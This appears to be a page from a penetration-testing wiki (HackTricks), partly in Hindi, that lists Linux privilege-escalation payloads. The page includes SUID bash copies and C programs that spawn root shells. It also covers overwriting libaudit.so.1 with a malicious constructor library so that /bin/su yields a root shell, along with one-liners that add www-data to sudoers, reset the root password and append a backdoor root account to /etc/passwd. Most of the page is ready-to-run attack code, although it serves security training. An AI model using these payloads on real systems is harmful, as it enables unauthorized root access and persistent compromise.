# Payloads to execute

{{#include ../../banners/hacktricks-training.md}}

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## विशेषाधिकार बढ़ाने के लिए फ़ाइल को ओवरराइट करना

### सामान्य फ़ाइलें

- _/etc/passwd_ में पासवर्ड के साथ उपयोगकर्ता जोड़ें
- _/etc/shadow_ के अंदर पासवर्ड बदलें
- _/etc/sudoers_ में उपयोगकर्ता को sudoers में जोड़ें
- आमतौर पर _/run/docker.sock_ या _/var/run/docker.sock_ में docker सॉकेट के माध्यम से docker का दुरुपयोग करें

### एक पुस्तकालय को ओवरराइट करना

कुछ बाइनरी द्वारा उपयोग की जाने वाली पुस्तकालय की जांच करें, इस मामले में `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
इस मामले में हम `/lib/x86_64-linux-gnu/libaudit.so.1` की नकल करने की कोशिश करते हैं।\
तो, **`su`** बाइनरी द्वारा उपयोग की जाने वाली इस पुस्तकालय के कार्यों की जांच करें:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
संकेत `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` और `audit_fd` संभवतः libaudit.so.1 पुस्तकालय से हैं। चूंकि libaudit.so.1 को दुर्भावनापूर्ण साझा पुस्तकालय द्वारा अधिलेखित किया जाएगा, ये संकेत नए साझा पुस्तकालय में मौजूद होने चाहिए, अन्यथा कार्यक्रम प्रतीक को नहीं ढूंढ पाएगा और बाहर निकल जाएगा।
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
अब, केवल **`/bin/su`** को कॉल करके आप रूट के रूप में एक शेल प्राप्त करेंगे।

## स्क्रिप्ट

क्या आप रूट को कुछ चलाने के लिए मजबूर कर सकते हैं?

### **www-data को sudoers में**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **रूट पासवर्ड बदलें**
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd में नया रूट उपयोगकर्ता जोड़ें
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
{{#include ../../banners/hacktricks-training.md}}
